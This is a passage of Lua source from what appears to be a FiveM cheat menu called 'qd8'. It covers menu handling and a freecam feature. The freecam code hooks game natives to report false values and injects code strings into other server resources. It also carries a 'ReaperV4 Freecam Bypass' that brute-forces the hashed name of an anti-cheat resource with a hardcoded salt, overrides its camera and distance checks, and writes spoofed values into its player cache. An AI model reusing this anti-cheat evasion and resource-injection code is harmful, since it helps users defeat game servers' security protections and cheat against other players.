        if not ok then self:Debug("red", "onSelect error: " .. tostring(err)) end
        return
    end

    if current.type == "checkbox" or current.type == "scrollable-checkbox" or current.type == "slider-checkbox" then
        if current.locked then
            self:Notify("error", "qd8", "This module has been disabled due to high detection rates!", 3000)
            return
        end

        if type(current.checked) ~= "boolean" then
            current.checked = true
        else
            current.checked = not current.checked
        end

        if current.onSelect and type(current.onSelect) == "function" then
            if current.type == "scrollable-checkbox" then
                local ok, err = pcall(current.onSelect, current.values[current.value], current.checked)
                if not ok then self:Debug("red", "scrollable-checkbox onSelect error: " .. tostring(err)) end
            elseif current.type == "slider-checkbox" then
                local ok, err = pcall(current.onSelect, current.value, current.checked)
                if not ok then self:Debug("red", "slider-checkbox onSelect error: " .. tostring(err)) end
            else
                local ok, err = pcall(current.onSelect, current.checked)
                if not ok then self:Debug("red", "checkbox onSelect error: " .. tostring(err)) end
            end
        end

        self:UpdateElements(CurrentMenu)
        return
    end

    if current.type == "scrollable" or current.type == "scrollable-checkbox" then
        if current.values and type(current.values) == "table" and #current.values > 0 then
            if current.onSelect then
                current.onSelect(current.values[current.value])
            end
        end

        return
    end

    if current.type == "slider" or current.type == "slider-checkbox" then
        if current.scrollType == "onEnter" and current.onSelect then
            if current.type == "slider-checkbox" then
                current.onSelect(current.value, current.checked or false)
            else
                current.onSelect(current.value)
            end
        end
        return
    end
end

local firstFallbackBlocked = false

function qd8:Backspace()
    if #MenuStack > 0 then
        local last = table.remove(MenuStack)
        table.remove(MenuLabelStack)
        CurrentMenu = last.menu or ActiveMenu
        CurrentCategories = last.categories
        CurrentCategoryIndex = last.categoryIndex or 1
        HoveredIndex = 1
        self:UpdateElements(CurrentMenu)
    else
        self:HideUI()
    end
end

function qd8:PrevCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex - 1
    if CurrentCategoryIndex < 1 then CurrentCategoryIndex = #CurrentCategories end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

function qd8:NextCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex + 1
    if CurrentCategoryIndex > #CurrentCategories then CurrentCategoryIndex = 1 end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

---@param state boolean
---@param speed number
function qd8:ToggleFreecam(state, speed)
    if type(state) ~= "boolean" then
        return
    end

    if state then
        FreecamEnabled = true
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = true, weaponIndex = CurrentWeaponIndex, vehicleIndex = CurrentVehicleIndex }))
        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
            if GetResourceState("WaveShield") == "started" then
                MachoHookNative(0x5234F9F10919EABA, function(...)
                    return false, -1
                end)

                MachoHookNative(0xA200EB1EE790F448, function(...)
                    return false, GetEntityCoords(PlayerPedId())
                end)

                MachoHookNative(0xC6D3D26810C8E0F9, function(...)
                    return false, false
                end)

                MachoHookNative(0x8D4D46230B2C353A, function(...)
                    return false, 0
                end)

                MachoHookNative(0xB15162CB5826E9E8, function(...)
                    return false, false
                end)

                MachoHookNative(0x19CAFA3C87F7C2FF, function(...)
                    return false, 0
                end)

                MachoHookNative(0xD5037BA82E12416F, function(...)
                    return false, 0
                end)

                MachoHookNative(0xFB92A102F1C4DFA3, function(...)
                    return false, true
                end)

                MachoHookNative(0x997ABD671D25CA0B, function(...)
                    return false, true
                end)

                _G.qd8FreecamSpeed = speed

                if not _G.qd8FreecamThreadRunning then
                    _G.qd8FreecamEnabled = true
                    _G.qd8FreecamThreadRunning = true
                
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    local function RotationToDirection(rot)
                        local z = math.rad(rot.z)
                        local x = math.rad(rot.x)
                        local num = math.abs(math.cos(x))
                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                    end

                    local function GetRightVector(rot)
                        local z = math.rad(rot.z)
                        return vector3(math.cos(z), math.sin(z), 0.0)
                    end

                    local function Clamp(val, min, max)
                        if val < min then return min end
                        if val > max then return max end
                        return val
                    end

                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                    hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    local coords = GetEntityCoords(PlayerPedId())
                    _G.qd8FreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    SetCamCoord(_G.qd8FreecamObject, coords.x, coords.y, coords.z + 2.0)
                    SetCamRot(_G.qd8FreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                    RenderScriptCams(true, false, 0, true, true)
                    
                    CreateThread(function()
                        while _G.qd8FreecamThreadRunning do
                            Wait(0)

                            if _G.qd8FreecamObject then
                                local coords = GetCamCoord(_G.qd8FreecamObject)
                                local rot = GetCamRot(_G.qd8FreecamObject, 2)
                                local beforeSpeed = _G.qd8FreecamSpeed or 0.25
                                local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                local forward = RotationToDirection(rot)
                                local right = GetRightVector(rot)
                                local moveX, moveY, moveZ = 0, 0, 0

                                TaskStandStill(PlayerPedId(), 10)
                                SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                SetCamCoord(_G.qd8FreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                local x = GetDisabledControlNormal(0, 1)
                                local y = GetDisabledControlNormal(0, 2)
                                local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                local newYaw = rot.z - x * 5

                                SetCamRot(_G.qd8FreecamObject, newPitch, rot.y, newYaw, 2)
                            end
                        end
                    end)
                else
                    _G.qd8FreecamEnabled = true
                end
            else
                Injection(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                print("hello im inside of a resource")
                    _G.qd8FreecamSpeed = ]] .. speed .. [[

                    if not _G.qd8FreecamThreadRunning then
                        _G.qd8FreecamEnabled = true
                        _G.qd8FreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.qd8FreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.qd8FreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.qd8FreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.qd8FreecamThreadRunning do
                                Wait(0)

                                if _G.qd8FreecamObject then
                                    local coords = GetCamCoord(_G.qd8FreecamObject)
                                    local rot = GetCamRot(_G.qd8FreecamObject, 2)
                                    local beforeSpeed = _G.qd8FreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.qd8FreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.qd8FreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.qd8FreecamEnabled = true
                    end
                ]])
            end
        else
            if not FreecamBypassReaperV4 then
                print("[^5qd8^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass")

                local function GetReaperV4SecurityResource()
                    local debugPrint = false

                    local function reaperHash(input, salt)
                        salt = salt or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1"
                        input = input .. salt

                        local hashValue = 5381

                        for i = 1, #input do
                            local byte = string.byte(input, i)
                            hashValue = (hashValue * 33) ~ byte
                        end

                        return hashValue
                    end

                    local targetStr = GetConvar("reaper_security_resource", "")
                    local target = tonumber(targetStr)
                    if not target then
                        return
                    end

                    local numResources = GetNumResources() or 0
                    local candidates = {}
                    for idx = 0, (numResources - 1) do
                        local resName = GetResourceByFindIndex(idx)
                        if resName and resName ~= "" then
                            table.insert(candidates, resName)
                        end
                    end

                    if #candidates == 0 then
                        return
                    end

                    local tried = 0
                    local found = nil
                    for i, cand in ipairs(candidates) do
                        tried = tried + 1
                        if reaperHash(cand) == target then
                            print("^7[^5qd8^7]: [^3DEBUG^7]: Reaper Security Resource Found: " .. cand)
                            found = cand
                            break
                        end

                        local alt = cand:gsub("[-_]", "")
                        if alt ~= cand and reaperHash(alt) == target then
                            found = alt
                            break
                        end

                        if tried % 50 == 0 then
                            Wait(0)
                        end
                    end

                    if found then
                        return found
                    end
                end

                local resource = GetReaperV4SecurityResource()

                MachoInjectResource("ReaperV4", [[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]])

                Wait(250)

                if resource then
                    MachoInjectResource(resource, [[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]])
                end

                MachoInjectResource("any", [[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]])

                print("[^5qd8^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass")
                FreecamBypassReaperV4 = true
            end

            _G.qd8FreecamSpeed = speed

            if not _G.qd8FreecamThreadRunning then
                _G.qd8FreecamEnabled = true
                _G.qd8FreecamThreadRunning = true

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                local function RotationToDirection(rot)
                    local z = math.rad(rot.z)
                    local x = math.rad(rot.x)
                    local num = math.abs(math.cos(x))
                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                end

                local function GetRightVector(rot)
                    local z = math.rad(rot.z)
                    return vector3(math.cos(z), math.sin(z), 0.0)
                end

                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end

                hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                local coords = GetEntityCoords(PlayerPedId())
                _G.qd8FreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                SetCamCoord(_G.qd8FreecamObject, coords.x, coords.y, coords.z + 2.0)
                SetCamRot(_G.qd8FreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                RenderScriptCams(true, false, 0, true, true)
                
                CreateThread(function()
                    while _G.qd8FreecamThreadRunning do
                        Wait(0)

                        if _G.qd8FreecamEnabled and _G.qd8FreecamObject then
                            local coords = GetCamCoord(_G.qd8FreecamObject)
                            local rot = GetCamRot(_G.qd8FreecamObject, 2)
                            local beforeSpeed = _G.qd8FreecamSpeed or 0.25
                            local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                            local forward = RotationToDirection(rot)
                            local right = GetRightVector(rot)
                            local moveX, moveY, moveZ = 0, 0, 0

                            TaskStandStill(PlayerPedId(), 10)
                            SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                            if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                            if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                            if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                            if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                            if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                            if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                            SetCamCoord(_G.qd8FreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                            local x = GetDisabledControlNormal(0, 1)
                            local y = GetDisabledControlNormal(0, 2)
                            local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                            local newYaw = rot.z - x * 5

                            SetCamRot(_G.qd8FreecamObject, newPitch, rot.y, newYaw, 2)
                        end
                    end
                end)
            else
                _G.qd8FreecamEnabled = true
            end
        end
    else
        FreecamEnabled = false
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = false }))
        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
            if GetResourceState("WaveShield") == "started" then
                _G.qd8FreecamEnabled = false
                _G.qd8FreecamThreadRunning = false

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                RenderScriptCams(false, false, 0, true, true)
                if _G.qd8FreecamObject then DestroyCam(_G.qd8FreecamObject, false) _G.qd8FreecamObject = nil end
                SetFocusEntity(PlayerPedId())
            else
                Injection(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                    _G.qd8FreecamEnabled = false
                    _G.qd8FreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
